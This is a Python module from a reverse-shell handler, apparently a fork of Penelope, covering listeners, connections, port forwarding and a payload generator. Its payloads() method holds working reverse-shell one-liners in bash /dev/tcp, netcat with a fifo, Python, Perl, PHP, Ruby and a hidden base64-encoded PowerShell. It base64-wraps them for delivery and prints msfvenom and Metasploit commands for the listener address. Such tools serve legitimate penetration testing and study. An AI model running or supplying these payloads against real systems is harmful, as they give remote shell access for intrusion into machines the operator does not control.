#!/usr/bin/env python3

# Part of Ariadne Shell Handler (a fork of Penelope, GPL-3.0-or-later). See LICENSE.

from .compat import *
from .compat import __program__
from .options import options
from .log import logger, cmdlogger
from .display import Interfaces, paint

# core: injected by ariadne/__init__.py after the singleton exists.

class ControlQueue:

	def __init__(self):
		self._out, self._in = os.pipe()
		self.queue = queue.Queue() # TODO
		self._lock = threading.Lock()

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		with self._lock:
			self.queue.put(command)
			try:
				os.write(self._in, b'\x00')
			except OSError:
				pass

	def get(self):
		command = self.queue.get()
		try:
			os.read(self._out, 1)
		except OSError:
			return 'stop'
		return command

	def clear(self):
		with self._lock:
			amount = 0
			while not self.queue.empty():
				try:
					self.queue.get_nowait()
					amount += 1
				except queue.Empty:
					break
			try:
				os.read(self._out, amount)
			except OSError:
				pass

	def close(self):
		# The queue items and the pipe bytes are consumed independently, so a
		# consumer can be waiting in queue.get() with no way out once the pipe
		# is gone (e.g. an exec loop that got woken by a reused fd). Push a
		# 'stop' sentinel first: every consumer treats it as an exit signal,
		# which unblocks and terminates the waiter instead of leaking it.
		try:
			self.queue.put('stop')
		except Exception:
			pass
		try:
			os.close(self._in)
		except OSError:
			pass
		try:
			os.close(self._out)
		except OSError:
			pass
		# Closed fd numbers get reused by unrelated files, which would make
		# select() report this queue as readable again. -1 is rejected by
		# select() with ValueError, so consumers stop watching the dead queue.
		self._in = self._out = -1



def handle_bind_errors(func):
	@wraps(func)
	def wrapper(*args, **kwargs):
		host = args[1]
		port = args[2]
		try:
			func(*args, **kwargs)
			return True

		except PermissionError:
			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
			print(dedent(
			f"""
			{paint('Workarounds:')}

			1) {paint('Port forwarding').UNDERLINE} (Run the Listener on a non-privileged port e.g 4444)
			    sudo iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft add rule ip nat prerouting tcp dport {port} redirect to 4444
			        {paint('then').white}
			    sudo iptables -t nat -D PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft delete rule ip nat prerouting tcp dport {port} redirect to 4444

			2) {paint('Setting CAP_NET_BIND_SERVICE capability').UNDERLINE}
			    sudo setcap 'cap_net_bind_service=+ep' {os.path.realpath(sys.executable)}
			    ariadne {port}
			    sudo setcap 'cap_net_bind_service=-ep' {os.path.realpath(sys.executable)}

			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.ariadne)
			    sudo ariadne {port}
			"""))

		except socket.gaierror:
			logger.error("Cannot resolve hostname")

		except OSError as e:
			if e.errno == EADDRINUSE:
				logger.error(f"The port '{port}' is currently in use")
			elif e.errno == EADDRNOTAVAIL:
				logger.error(f"Cannot listen on '{host}'")
			else:
				logger.error(f"OSError: {str(e)}")

		except OverflowError:
			logger.error("Invalid port number. Valid numbers: 1-65535")

		except ValueError:
			logger.error("Port number must be numeric")

		return False
	return wrapper



def Connect(host, port):
	try:
		port = int(port)
	except ValueError:
		logger.error("Port number must be numeric")
		return False
	_socket = socket.socket()
	_socket.settimeout(5)
	try:
		_socket.connect((host, port))
		_socket.settimeout(None)
	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")
	except OSError:
		logger.error(f"Cannot reach {host}")
	except OverflowError:
		logger.error("Invalid port number. Valid numbers: 1-65535")
	else:
		if not core.started:
			core.start()
		logger.info(f"Connected to {paint(host).blue}:{paint(port).orange}")
		from .engine import Session  # deferred: engine.py imports this module at its own top level
		# Daemon: setup performs several timeout-bounded round-trips, which can
		# sum up to tens of seconds against an unresponsive target. Finishing
		# that setup is pointless once the handler is exiting, and a non-daemon
		# thread here would stall _thread._shutdown() for the same duration.
		threading.Thread(target=Session, args=(_socket, host, port), name=f"NewCon{(host, port)}", daemon=True).start()
		return True
	_socket.close()
	return False



class Forwarding:

	def __init__(self, session, info, control, thread, server):
		self.session = session
		self.info = info            # (_type, lhost, lport, rhost, rport)
		self.control = control
		self.thread = thread
		self.server = server
		self.id = core.new_forwardingID
		core.forwardings[self.id] = self
		session.tasks['portfwd'].append(self)

	def __str__(self):
		_type, lhost, lport, rhost, rport = self.info
		arrow = '->' if _type == 'L' else '<-'
		return f"{lhost}:{lport} {arrow} {rhost}:{rport}"

	def stop(self):
		logger.warning(f"Stopping Port Forwarding: {self}")
		self.server.shutdown()
		self.thread.join()
		core.forwardings.pop(self.id, None)
		try:
			self.session.tasks['portfwd'].remove(self)
		except ValueError:
			pass



class TCPListener:

	def __init__(self, host=None, port=None, jump=None):
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.port = port or options.default_listener_port
		self.jump = []
		if jump:
			for j in jump:
				host, sep, port = j.rpartition(':')
				if not sep or not host or not port.isdigit():
					logger.error(f"Invalid jump endpoint: {j} (expected host:port)")
					continue
				self.jump.append((host, port))

		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)
		self.caller = caller()

		if self.bind(self.host, self.port):
			self.start()
		else:
			self.socket.close()

	def __str__(self):
		return f"TCPListener({self.host}:{self.port})"

	def __bool__(self):
		return hasattr(self, 'id')

	@handle_bind_errors
	def bind(self, host, port):
		self.port = int(port)
		self.socket.bind((host, self.port))

	def fileno(self):
		return self.socket.fileno()

	def start(self):
		specific = ""
		if self.host == '0.0.0.0':
			specific = paint('-> ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().ips])

		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').white}{paint(self.port).orange} {specific}")

		self.socket.listen(5)

		self.id = core.new_listenerID
		core.rlist.append(self)
		core.listeners[self.id] = self
		if not core.started:
			core.start()

		core.control << None

		if options.payloads:
			print(self.payloads())

	def stop(self):

		if threading.current_thread().name != 'Core':
			core.control << (lambda: core.listeners[self.id].stop())
			return

		core.rlist.remove(self)
		del core.listeners[self.id]

		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if options.single_session and core.sessions and not self.caller == 'spawn':
			logger.info(f"Stopping {self} due to Single Session mode")
		else:
			logger.warning(f"Stopping {self}")

	def payloads(self, interface_filter=None, target_os='both'):
		pairs = Interfaces().pairs
		name_of_ip = {ip: name for name, ip in pairs}
		presets = {
			"bash": "(bash >& /dev/tcp/{}/{} 0>&1) &",
			"nc_fifo": "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
			"python3": '(python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\') >/dev/null 2>&1 &',
			"perl": '(perl -e \'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");}};\') >/dev/null 2>&1 &',
			"php": '(php -r \'$sock=fsockopen("{}",{});exec("/bin/sh <&3 >&3 2>&3");\') >/dev/null 2>&1 &',
			"ruby": '(ruby -rsocket -e \'c=TCPSocket.new("{}",{});$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh"\') >/dev/null 2>&1 &',
			"msfvenom_elf": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o shell.elf",
			"msfvenom_exe": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe",
			"powershell": '$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()', # Taken from revshells.com
		}

		def oneliner(name, shell, ip, port):
			# The target gets the payload base64 encoded, so quoting survives whatever
			# mangles it on the way in.
			payload = base64.b64encode(presets[name].format(ip, port).encode()).decode()
			return f"printf {payload}|base64 -d|{shell}"

		output = [str(paint(self).white_MAGENTA)]
		output.append("")
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for _, ip in pairs]
		if self.jump:
			ips[:0] = self.jump

		interface_count = 0
		for ip in ips:
			if isinstance(ip, tuple):
				ip, port = ip
				iface_name = paint('JUMP').RED
			else:
				port = self.port
				iface_name = name_of_ip.get(ip)
				if interface_filter and iface_name != interface_filter:
					continue
				iface_name = paint(iface_name).GREEN_black
			interface_count += 1
			output.extend((f'{iface_name} -> {str(paint(ip).cyan)}:{str(paint(port).orange)}', ''))
			blocks = []
			if target_os in ('linux', 'both'):
				blocks.append(("Bash TCP", oneliner("bash", "bash", ip, port)))
				blocks.append(("Netcat + named pipe", oneliner("nc_fifo", "sh", ip, port)))
				blocks.append(("Python3", oneliner("python3", "sh", ip, port)))
				blocks.append(("Perl", oneliner("perl", "sh", ip, port)))
				blocks.append(("PHP", oneliner("php", "sh", ip, port)))
				blocks.append(("Ruby", oneliner("ruby", "sh", ip, port)))
				# msfvenom runs on this machine, not on the target, so it is printed as is.
				blocks.append(("Msfvenom ELF", presets["msfvenom_elf"].format(ip, port)))
			if target_os in ('windows', 'both'):
				blocks.append(("Powershell",
					"cmd /c powershell -nop -w hidden -e " + base64.b64encode(presets["powershell"].format(ip, port).encode("utf-16le")).decode()))
				blocks.append(("Msfvenom EXE", presets["msfvenom_exe"].format(ip, port)))
			blocks.append(("Metasploit", "\n".join((
				"set PAYLOAD generic/shell_reverse_tcp",
				f"set LHOST {ip}",
				f"set LPORT {port}",
				"set DisablePayloadHandler true"
			))))

			for index, (title, body) in enumerate(blocks):
				if index:
					output.append("")
				output.append(str(paint(title).UNDERLINE))
				output.append(body)
			output.append("")

		output.append("─" * 80)
		if not interface_count:
			return ""
		return '\n'.join(output) + "\n"




class Channel:

	def __init__(self, raw=False, expect = []):
		self._read, self._write = os.pipe()
		self.can_use = True
		self.active = True
		self.control = ControlQueue()

	def fileno(self):
		return self._read

	def read(self):
		return os.read(self._read, options.network_buffer_size)

	def write(self, data):
		os.write(self._write, data)

	def close(self):
		try:
			os.close(self._read)
		except OSError:
			pass
		self._read = -1
		try:
			os.close(self._write)
		except OSError:
			pass
		self._write = -1
